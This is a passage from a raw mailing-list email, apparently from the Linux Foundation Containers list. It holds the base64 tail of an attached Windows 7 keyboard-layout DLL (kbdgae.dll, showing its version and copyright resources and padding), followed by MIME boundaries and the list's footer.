+AAA2AC4AMQAuADcANgAwADAALgAxADYAMwA4ADUAIAAoAHcAaQBuADcAXwByAHQAbQAuADAA
+OQAwADcAMQAzAC0AMQAyADUANQApAAAAPAAOAAEASQBuAHQAZQByAG4AYQBsAE4AYQBtAGUA
+AABrAGIAZABnAGEAZQAgACgAMwAuADEAMwApAAAAgAAuAAEATABlAGcAYQBsAEMAbwBwAHkA
+cgBpAGcAaAB0AAAAqQAgAE0AaQBjAHIAbwBzAG8AZgB0ACAAQwBvAHIAcABvAHIAYQB0AGkA
+bwBuAC4AIABBAGwAbAAgAHIAaQBnAGgAdABzACAAcgBlAHMAZQByAHYAZQBkAC4AAAA+AAsA
+AQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBuAGEAbQBlAAAAawBiAGQAZwBhAGUALgBkAGwA
+bAAAAAAAagAlAAEAUAByAG8AZAB1AGMAdABOAGEAbQBlAAAAAABNAGkAYwByAG8AcwBvAGYA
+dACuACAAVwBpAG4AZABvAHcAcwCuACAATwBwAGUAcgBhAHQAaQBuAGcAIABTAHkAcwB0AGUA
+bQAAAAAAQgAPAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAANgAuADEALgA3ADYA
+MAAwAC4AMQA2ADMAOAA1AAAAAABEAAAAAQBWAGEAcgBGAGkAbABlAEkAbgBmAG8AAAAAACQA
+BAAAAFQAcgBhAG4AcwBsAGEAdABpAG8AbgAAAAAAAACwBAAAAAAAAAAAABAAAKQAAAAAoQih
+EKEYoSChKKEwoUChSKGopLCkOKVwpoCmkKagprCmwKbIqtiq6Kr4qgirGKsoqzirSKtYq2ir
+eKuIq5irqKu4q8ir2Kvoq/irCKwYrDisSKxYrGiseKyIrJisqKy4rMis2KzorPisCK0YrSit
+OK1IrVitaK14rYitmK2orbityK3Yreit+K0IrhiuKK44rkiuWK5orniuiK4AAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAA=
+------------6FA56F634634D74
+Content-Type: text/plain
+
+
+
+------------6FA56F634634D74--
+
+--f6e275e0-b92c-4358-85ed-bf2ce2124b98--
+
+--===============0896809756091238322==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
+
+_______________________________________________
+Containers mailing list
+Containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+https://lists.linuxfoundation.org/mailman/listinfo/containers
+--===============0896809756091238322==--
